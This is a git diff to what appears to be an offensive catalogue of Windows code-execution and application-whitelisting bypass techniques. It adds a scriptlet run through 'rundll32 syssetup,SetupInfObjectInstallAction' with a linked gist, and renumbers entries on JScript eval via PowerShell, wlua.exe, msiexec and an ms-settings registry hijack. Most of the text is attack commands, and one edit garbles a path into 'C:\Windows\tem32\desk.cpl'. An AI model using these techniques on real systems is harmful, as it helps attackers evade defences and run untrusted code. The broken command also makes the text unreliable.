@@ -42,7 +42,7 @@ https://gist.githubusercontent.com/homjxi0e/a27e34d7be34731fb637e820c883c8bc/raw
 ```
 &- Add Values in HKLM Name File ms-settings in Open/Shell/Command
 &- rundll32 accessibilitycpl.dll,DllRegisterServer 
-&- rundll32 shell32.dll,Control_RunDLL "C:\Windows\System32\desk.cpl"
+&- rundll32 shell32.dll,Control_RunDLL "C:\Windows\tem32\desk.cpl"
 ```
 ( 7 ) Language LUA in Files .wlua
 ```
@@ -51,7 +51,14 @@ wlua.exe C:\testing.wlua
 https://gist.githubusercontent.com/homjxi0e/bbd218dea9bf63fd36524b9777a399f3/raw/888f7e484651fdb733d6261ca002d684a6e5bf9b/Test.wlua
 ```
 
-( 8 ) Jscript Execute Code Via ( Eval,VSA,) 
+( 8 ) SCT ScriptLet Execution in My INFScript
+```
+rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 C:\INFPS.inf
+&- Raw Code 
+https://gist.github.com/homjxi0e/87b29da0d4f504cb675bb1140a931415
+```
+
+( 9 ) Jscript Execute Code Via ( Eval,VSA,) 
 ```
 [Reflection.Assembly]::LoadWithPartialName('Microsoft.JSCript')
 $attack = 'var invokeMethod = new ActiveXObject("WScript.Shell");invokeMethod.Run("notepad.exe")'
@@ -60,7 +67,7 @@ $attack = 'var invokeMethod = new ActiveXObject("WScript.Shell");invokeMethod.Ru
 https://gist.githubusercontent.com/homjxi0e/0d683007bd4a3ce39d3e19342aaa68ec/raw/4c8709382280de158b99dd78f91875e32a54bac4/ATPSJScript
 ```
 
-( 9 ) MSI Launch Execution ( MsiExec.exe ) 
+( 10 ) MSI Launch Execution ( MsiExec.exe ) 
 ```
  msiexec.exe C:\testing.msi 
  &- File MSI Hello World Exe in .MSI 
